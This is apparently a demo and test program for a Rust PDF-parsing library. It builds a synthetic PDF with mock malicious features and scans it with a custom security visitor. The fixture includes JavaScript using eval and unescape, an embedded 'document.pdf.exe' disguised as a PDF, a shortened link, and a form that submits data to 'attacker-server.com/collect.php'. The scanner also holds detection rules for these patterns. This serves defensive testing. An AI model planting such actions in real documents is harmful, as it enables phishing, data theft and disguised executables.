use pdf_ast::{
    AstNode, NodeType, PdfArray, PdfDictionary, PdfDocument, PdfName, PdfValue, QueryBuilder,
    Visitor, VisitorAction,
};
// Removed unused imports: File, BufReader

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("pdf-core - Experimental Analysis Demo");
    println!("===============================================\n");

    // Create a comprehensive test document
    let document = create_comprehensive_test_document();

    // 1. Basic Document Analysis
    perform_basic_analysis(&document);

    // 2. Security Analysis
    perform_security_analysis(&document);

    // 3. Structure Analysis
    perform_structure_analysis(&document);

    // 4. Content Analysis
    perform_content_analysis(&document);

    // 5. Metadata Analysis
    perform_metadata_analysis(&document);

    println!("\nExperimental analysis complete.");

    Ok(())
}

fn create_comprehensive_test_document() -> PdfDocument {
    let mut doc = PdfDocument::new(pdf_ast::PdfVersion::new(1, 7));

    // Create catalog
    let mut catalog = PdfDictionary::new();
    catalog.insert("Type", PdfValue::Name(PdfName::new("Catalog")));
    catalog.insert("Version", PdfValue::Name(PdfName::new("1.7")));

    let catalog_id = doc
        .ast
        .create_node(NodeType::Catalog, PdfValue::Dictionary(catalog));
    doc.set_catalog(catalog_id);

    // Create pages with various content
    for i in 0..5 {
        let mut page_dict = PdfDictionary::new();
        page_dict.insert("Type", PdfValue::Name(PdfName::new("Page")));
        page_dict.insert(
            "MediaBox",
            PdfValue::Array(PdfArray::from(vec![
                PdfValue::Integer(0),
                PdfValue::Integer(0),
                PdfValue::Integer(612),
                PdfValue::Integer(792),
            ])),
        );
        page_dict.insert("PageNumber", PdfValue::Integer(i + 1));

        let page_id = doc
            .ast
            .create_node(NodeType::Page, PdfValue::Dictionary(page_dict));

        doc.ast
            .add_edge(catalog_id, page_id, pdf_ast::ast::EdgeType::Child);

        // Add some content to certain pages
        if i == 1 {
            // Add JavaScript action to page 2
            add_javascript_action(&mut doc, page_id);
        }

        if i == 2 {
            // Add embedded file to page 3
            add_embedded_file(&mut doc, page_id);
        }

        if i == 3 {
            // Add annotations to page 4
            add_annotations(&mut doc, page_id);
        }

        // Add fonts to all pages
        add_fonts(&mut doc, page_id, (i + 1) as usize);
    }

    // Add info dictionary
    add_info_dictionary(&mut doc);

    // Update metadata
    doc.analyze_metadata();

    doc
}

fn add_javascript_action(doc: &mut PdfDocument, page_id: pdf_ast::NodeId) {
    let mut js_action = PdfDictionary::new();
    js_action.insert("Type", PdfValue::Name(PdfName::new("Action")));
    js_action.insert("S", PdfValue::Name(PdfName::new("JavaScript")));
    js_action.insert("JS", PdfValue::String(pdf_ast::PdfString::new_literal(
        b"app.alert('This is a test JavaScript in PDF!');\nvar payload = unescape('%u4141%u4141');\neval('console.log(\"Potentially suspicious code\");');"
    )));

    let js_id = doc
        .ast
        .create_node(NodeType::Action, PdfValue::Dictionary(js_action));

    doc.ast
        .add_edge(page_id, js_id, pdf_ast::ast::EdgeType::Child);
}

fn add_embedded_file(doc: &mut PdfDocument, page_id: pdf_ast::NodeId) {
    let mut file_spec = PdfDictionary::new();
    file_spec.insert("Type", PdfValue::Name(PdfName::new("Filespec")));
    file_spec.insert(
        "F",
        PdfValue::String(pdf_ast::PdfString::new_literal(
            b"document.pdf.exe", // Suspicious double extension
        )),
    );
    file_spec.insert(
        "UF",
        PdfValue::String(pdf_ast::PdfString::new_literal(b"Important_Document.pdf")),
    );

    let file_id = doc
        .ast
        .create_node(NodeType::EmbeddedFile, PdfValue::Dictionary(file_spec));

    doc.ast
        .add_edge(page_id, file_id, pdf_ast::ast::EdgeType::Child);
}

fn add_annotations(doc: &mut PdfDocument, page_id: pdf_ast::NodeId) {
    // URI Link annotation
    let mut uri_annot = PdfDictionary::new();
    uri_annot.insert("Type", PdfValue::Name(PdfName::new("Annot")));
    uri_annot.insert("Subtype", PdfValue::Name(PdfName::new("Link")));

    let mut uri_action = PdfDictionary::new();
    uri_action.insert("Type", PdfValue::Name(PdfName::new("Action")));
    uri_action.insert("S", PdfValue::Name(PdfName::new("URI")));
    uri_action.insert(
        "URI",
        PdfValue::String(pdf_ast::PdfString::new_literal(
            b"http://bit.ly/suspicious-link",
        )),
    );

    uri_annot.insert("A", PdfValue::Dictionary(uri_action));

    let uri_id = doc
        .ast
        .create_node(NodeType::Annotation, PdfValue::Dictionary(uri_annot));

    doc.ast
        .add_edge(page_id, uri_id, pdf_ast::ast::EdgeType::Child);

    // Form field annotation with submit action
    let mut form_annot = PdfDictionary::new();
    form_annot.insert("Type", PdfValue::Name(PdfName::new("Annot")));
    form_annot.insert("Subtype", PdfValue::Name(PdfName::new("Widget")));
    form_annot.insert("FT", PdfValue::Name(PdfName::new("Tx")));

    let mut submit_action = PdfDictionary::new();
    submit_action.insert("Type", PdfValue::Name(PdfName::new("Action")));
    submit_action.insert("S", PdfValue::Name(PdfName::new("SubmitForm")));
    submit_action.insert(
        "F",
        PdfValue::String(pdf_ast::PdfString::new_literal(
            b"http://attacker-server.com/collect.php",
        )),
    );

    form_annot.insert("A", PdfValue::Dictionary(submit_action));

    let form_id = doc
        .ast
        .create_node(NodeType::Annotation, PdfValue::Dictionary(form_annot));

    doc.ast
        .add_edge(page_id, form_id, pdf_ast::ast::EdgeType::Child);
}

fn add_fonts(doc: &mut PdfDocument, page_id: pdf_ast::NodeId, page_num: usize) {
    let font_names = [
        "Times-Roman",
        "Helvetica",
        "Courier",
        "Symbol",
        "Times-Bold",
    ];
    let font_name = font_names[page_num % font_names.len()];

    let mut font_dict = PdfDictionary::new();
    font_dict.insert("Type", PdfValue::Name(PdfName::new("Font")));
    font_dict.insert("Subtype", PdfValue::Name(PdfName::new("Type1")));
    font_dict.insert("BaseFont", PdfValue::Name(PdfName::new(font_name)));
    font_dict.insert("Encoding", PdfValue::Name(PdfName::new("WinAnsiEncoding")));

    // Some fonts are embedded, some are not (compliance issue)
    if page_num % 2 == 0 {
        font_dict.insert(
            "FontFile",
            PdfValue::String(pdf_ast::PdfString::new_literal(b"embedded_font_data")),
        );
    }

    let font_id = doc
        .ast
        .create_node(NodeType::Font, PdfValue::Dictionary(font_dict));

    doc.ast
        .add_edge(page_id, font_id, pdf_ast::ast::EdgeType::Child);
}

fn add_info_dictionary(doc: &mut PdfDocument) {
    let mut info_dict = PdfDictionary::new();
    info_dict.insert(
        "Title",
        PdfValue::String(pdf_ast::PdfString::new_literal(
            b"pdf-core experimental test document",
        )),
    );
    info_dict.insert(
        "Author",
        PdfValue::String(pdf_ast::PdfString::new_literal(
            b"PDF-AST Security Research Team",
        )),
    );
    info_dict.insert(
        "Subject",
        PdfValue::String(pdf_ast::PdfString::new_literal(
            b"Comprehensive security and compliance testing",
        )),
    );
    info_dict.insert(
        "Keywords",
        PdfValue::String(pdf_ast::PdfString::new_literal(
            b"security,malware,compliance,PDF/A,accessibility",
        )),
    );
    info_dict.insert(
        "Creator",
        PdfValue::String(pdf_ast::PdfString::new_literal(
            b"pdf-core experimental library v0.1.1-alpha",
        )),
    );
    info_dict.insert(
        "Producer",
        PdfValue::String(pdf_ast::PdfString::new_literal(b"Rust PDF-AST Engine")),
    );
    info_dict.insert(
        "CreationDate",
        PdfValue::String(pdf_ast::PdfString::new_literal(b"D:20250101120000+00'00'")),
    );
    info_dict.insert(
        "ModDate",
        PdfValue::String(pdf_ast::PdfString::new_literal(b"D:20250101120000+00'00'")),
    );

    let info_id = doc
        .ast
        .create_node(NodeType::Metadata, PdfValue::Dictionary(info_dict));

    doc.set_info(info_id);
}

fn perform_basic_analysis(document: &PdfDocument) {
    println!("BASIC DOCUMENT ANALYSIS");
    println!("=======================");

    println!("PDF Version: {}", document.version);
    println!("Total AST Nodes: {}", document.ast.node_count());
    println!("Total AST Edges: {}", document.ast.edge_count());
    println!("Document Pages: {}", document.metadata.page_count);
    println!("Is Cyclic Graph: {}", document.ast.is_cyclic());

    // Validation
    let validation_errors = document.validate_structure();
    if validation_errors.is_empty() {
        println!("Document structure is valid");
    } else {
        println!("Validation warnings:");
        for error in &validation_errors {
            println!("   - {}", error);
        }
    }

    println!();
}

fn perform_security_analysis(document: &PdfDocument) {
    println!("🔒 SECURITY ANALYSIS");
    println!("====================");

    // Custom security scanner
    struct DetailedSecurityScanner {
        threats_found: usize,
        javascript_found: bool,
        suspicious_urls: Vec<String>,
        embedded_executables: Vec<String>,
        form_submissions: Vec<String>,
    }

    impl DetailedSecurityScanner {
        fn new() -> Self {
            Self {
                threats_found: 0,
                javascript_found: false,
                suspicious_urls: Vec::new(),
                embedded_executables: Vec::new(),
                form_submissions: Vec::new(),
            }
        }
    }

    impl Visitor for DetailedSecurityScanner {
        fn visit_action(&mut self, _node: &AstNode, dict: &PdfDictionary) -> VisitorAction {
            if let Some(PdfValue::Name(action_type)) = dict.get("S") {
                match action_type.without_slash() {
                    "JavaScript" | "JS" => {
                        self.javascript_found = true;
                        self.threats_found += 1;
                        println!("🚨 JavaScript detected!");

                        if let Some(PdfValue::String(js_code)) = dict.get("JS") {
                            let code = js_code.to_string_lossy();
                            println!(
                                "   Code snippet: {}...",
                                if code.len() > 80 { &code[..80] } else { &code }
                            );

                            // Analyze for suspicious patterns
                            if code.contains("unescape") || code.contains("eval") {
                                println!("   WARNING: Contains suspicious obfuscation patterns!");
                            }
                        }
                    }
                    "URI" => {
                        if let Some(PdfValue::String(uri)) = dict.get("URI") {
                            let url = uri.to_string_lossy();
                            self.suspicious_urls.push(url.clone());
                            println!("Outbound URL detected: {}", url);

                            if url.contains("bit.ly") || url.contains("tinyurl") {
                                println!(
                                    "   WARNING: URL shortener detected - potential phishing risk!"
                                );
                                self.threats_found += 1;
                            }
                        }
                    }
                    "SubmitForm" => {
                        if let Some(PdfValue::String(url)) = dict.get("F") {
                            let submit_url = url.to_string_lossy();
                            self.form_submissions.push(submit_url.clone());
                            println!("Form submission detected: {}", submit_url);
                            self.threats_found += 1;
                        }
                    }
                    _ => {
                        println!("Info: Action type: {}", action_type.without_slash());
                    }
                }
            }
            VisitorAction::Continue
        }

        fn visit_embedded_file(&mut self, _node: &AstNode, dict: &PdfDictionary) -> VisitorAction {
            if let Some(PdfValue::String(filename)) = dict.get("F") {
                let name = filename.to_string_lossy();
                println!("📎 Embedded file detected: {}", name);

                if name.ends_with(".exe") || name.contains(".pdf.exe") {
                    self.embedded_executables.push(name.clone());
                    println!("   🚨 EXECUTABLE FILE DETECTED - HIGH RISK!");
                    self.threats_found += 1;
                }
            }
            VisitorAction::Continue
        }
    }

    let mut scanner = DetailedSecurityScanner::new();
    let mut walker = pdf_ast::visitor::AstWalker::new(&document.ast);
    walker.walk(&mut scanner);

    println!("\nSecurity Summary:");
    println!("   Total threats: {}", scanner.threats_found);
    println!("   JavaScript present: {}", scanner.javascript_found);
    println!("   Suspicious URLs: {}", scanner.suspicious_urls.len());
    println!(
        "   Embedded executables: {}",
        scanner.embedded_executables.len()
    );
    println!("   Form submissions: {}", scanner.form_submissions.len());

    let risk_level = match scanner.threats_found {
        0 => "LOW",
        1..=2 => "MEDIUM",
        3..=5 => "HIGH",
        _ => "CRITICAL",
    };

    println!("   Risk Level: {}", risk_level);
    println!();
}

fn perform_structure_analysis(document: &PdfDocument) {
    println!("STRUCTURE ANALYSIS");
    println!("==================");

    // Node type analysis
    let node_types = [
        (NodeType::Catalog, "Catalogs"),
        (NodeType::Pages, "Page Trees"),
        (NodeType::Page, "Pages"),
        (NodeType::Font, "Fonts"),
        (NodeType::Image, "Images"),
        (NodeType::Action, "Actions"),
        (NodeType::Annotation, "Annotations"),
        (NodeType::EmbeddedFile, "Embedded Files"),
        (NodeType::Metadata, "Metadata Objects"),
    ];

    for (node_type, description) in &node_types {
        let nodes = document.ast.find_nodes_by_type(node_type.clone());
        if !nodes.is_empty() {
            println!("{}: {}", description, nodes.len());
        }
    }

    // Query builder demonstration
    println!("\nAdvanced Queries:");

    let pages_with_actions = QueryBuilder::new()
        .with_type(NodeType::Action)
        .execute(&document.ast);
    println!(
        "Pages with interactive actions: {}",
        pages_with_actions.len()
    );

    let error_nodes = QueryBuilder::new().with_errors(true).execute(&document.ast);
    println!("Nodes with parsing errors: {}", error_nodes.len());

    let shallow_nodes = QueryBuilder::new().with_max_depth(3).execute(&document.ast);
    println!("Nodes at depth ≤ 3: {}", shallow_nodes.len());

    println!();
}

fn perform_content_analysis(document: &PdfDocument) {
    println!("CONTENT ANALYSIS");
    println!("================");

    // Font analysis
    let font_nodes = document.ast.find_nodes_by_type(NodeType::Font);
    println!("Font Analysis:");
    println!("  Total fonts: {}", font_nodes.len());

    let mut embedded_fonts = 0;
    let mut font_types = std::collections::HashMap::new();

    let font_nodes_len = font_nodes.len();
    for font_id in font_nodes {
        if let Some(font_node) = document.ast.get_node(font_id) {
            if let Some(font_dict) = font_node.as_dict() {
                // Check if embedded
                if font_dict.get("FontFile").is_some()
                    || font_dict.get("FontFile2").is_some()
                    || font_dict.get("FontFile3").is_some()
                {
                    embedded_fonts += 1;
                }

                // Count font types
                if let Some(PdfValue::Name(subtype)) = font_dict.get("Subtype") {
                    *font_types
                        .entry(subtype.without_slash().to_string())
                        .or_insert(0) += 1;
                }
            }
        }
    }

    println!("  Embedded fonts: {}", embedded_fonts);
    println!("  Non-embedded fonts: {}", font_nodes_len - embedded_fonts);

    if !font_types.is_empty() {
        println!("  Font types:");
        for (font_type, count) in font_types {
            println!("    {}: {}", font_type, count);
        }
    }

    // Action analysis
    let action_nodes = document.ast.find_nodes_by_type(NodeType::Action);
    if !action_nodes.is_empty() {
        println!("\nInteractive Elements:");
        println!("  Actions: {}", action_nodes.len());

        let mut action_types = std::collections::HashMap::new();
        for action_id in action_nodes {
            if let Some(action_node) = document.ast.get_node(action_id) {
                if let Some(action_dict) = action_node.as_dict() {
                    if let Some(PdfValue::Name(action_type)) = action_dict.get("S") {
                        *action_types
                            .entry(action_type.without_slash().to_string())
                            .or_insert(0) += 1;
                    }
                }
            }
        }

        println!("  Action types:");
        for (action_type, count) in action_types {
            println!("    {}: {}", action_type, count);
        }
    }

    println!();
}

fn perform_metadata_analysis(document: &PdfDocument) {
    println!("METADATA ANALYSIS");
    println!("=================");

    println!("Document Properties:");
    println!(
        "  Creator: {}",
        document.metadata.creator.as_deref().unwrap_or("Unknown")
    );
    println!(
        "  Producer: {}",
        document.metadata.producer.as_deref().unwrap_or("Unknown")
    );
    println!(
        "  Creation Date: {}",
        document
            .metadata
            .creation_date
            .as_deref()
            .unwrap_or("Unknown")
    );
    println!(
        "  Modification Date: {}",
        document
            .metadata
            .modification_date
            .as_deref()
            .unwrap_or("Unknown")
    );

    println!("\nSecurity Features:");
    println!("  Encrypted: {}", document.metadata.encrypted);
    println!("  Has JavaScript: {}", document.metadata.has_javascript);
    println!("  Has Forms: {}", document.metadata.has_forms);
    println!(
        "  Has Embedded Files: {}",
        document.metadata.has_embedded_files
    );
    println!(
        "  Has Digital Signatures: {}",
        document.metadata.has_signatures
    );

    println!("\nCompliance Information:");
    for profile in &document.metadata.compliance {
        println!("  Compliance Profile: {:?}", profile);
    }

    if document.metadata.compliance.is_empty() {
        println!("  No specific compliance profiles detected");

        // Analyze compliance potential
        let font_nodes = document.ast.find_nodes_by_type(NodeType::Font);
        let embedded_font_count = font_nodes
            .iter()
            .filter_map(|&id| document.ast.get_node(id))
            .filter_map(|node| node.as_dict())
            .filter(|dict| {
                dict.get("FontFile").is_some()
                    || dict.get("FontFile2").is_some()
                    || dict.get("FontFile3").is_some()
            })
            .count();

        if embedded_font_count == font_nodes.len() && !document.metadata.has_javascript {
            println!("  Potential PDF/A-1b compliance (needs verification)");
        }
    }

    println!();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_comprehensive_document_creation() {
        let doc = create_comprehensive_test_document();
        assert!(doc.metadata.page_count > 0);
        assert!(doc.ast.node_count() > 10);
        assert!(doc.metadata.has_javascript);
        assert!(doc.metadata.has_embedded_files);
    }

    #[test]
    fn test_security_analysis() {
        let doc = create_comprehensive_test_document();
        // This would run the security analysis
        perform_security_analysis(&doc);
        // In a real test, we'd assert on specific findings
    }
}
